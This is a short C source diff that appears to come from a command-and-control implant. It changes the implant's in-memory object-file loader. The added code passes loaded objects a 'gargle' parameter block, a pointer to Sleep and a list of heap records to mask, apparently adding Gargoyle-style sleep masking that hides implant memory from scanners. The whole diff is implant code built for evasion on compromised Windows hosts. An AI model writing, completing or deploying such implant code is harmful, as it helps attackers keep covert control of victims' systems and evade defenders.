@@ -13,6 +13,7 @@
 #include "inject.h"
 #include "bformat.h"
 #include "datastore.h"
+#include "gargleint.h"
 
 #define RELOC_ENDTABLE 0
 #define RELOC_ADDR64   1
@@ -426,7 +427,7 @@ static char * bof_cached;
 static SIZE_T bof_cached_size;
 static int    bof_cached_how;
 
-BOOL command_inline_execute_object_parsed(char * objblob, int objlen, DWORD entry, char * args, int alen) {
+BOOL command_inline_execute_object_parsed(char * objblob, int objlen, DWORD entry, char * args, int alen, int conv) {
 	datap parser;
 	datap relocsparser;
 	datap_buffer code, rdata, data, xdata, pdata, relocs;
@@ -561,8 +562,18 @@ BOOL command_inline_execute_object_parsed(char * objblob, int objlen, DWORD entr
 		if (code.buffer)
 			memset(code.buffer, 0, code.length);
 		inlinefunc = (void(*)(char * buffer, int length))(code_dst + entry);
-		if (finalize_memory_permissions(base, total))
-			inlinefunc(args, alen);
+		if (finalize_memory_permissions(base, total)) {
+			if (conv == 1 && gparms != NULL) {
+				DWORD t = 0;
+				if (args != NULL && alen >= (int)sizeof(DWORD))
+					memcpy(&t, args, sizeof(DWORD));
+				gparms->heap_records = track_memory_get_heap_records_to_mask();
+				((void (*)(GARGLEP *, void *, DWORD))inlinefunc)(gparms, (void *)Sleep, t);
+			}
+			else {
+				inlinefunc(args, alen);
+			}
+		}
 	}
 
 	if (!setting_short(SETTING_BOF_REUSE_MEMORY)) {
@@ -593,5 +604,5 @@ void command_inline_execute_object(char * buffer, int length) {
 	prefix_len = length - parser.length;
 	entry = data_int(&parser);
 	args = data_extract(&parser);
-	command_inline_execute_object_parsed(buffer, prefix_len, entry, args.buffer, args.length);
+	command_inline_execute_object_parsed(buffer, prefix_len, entry, args.buffer, args.length, 0);
 }
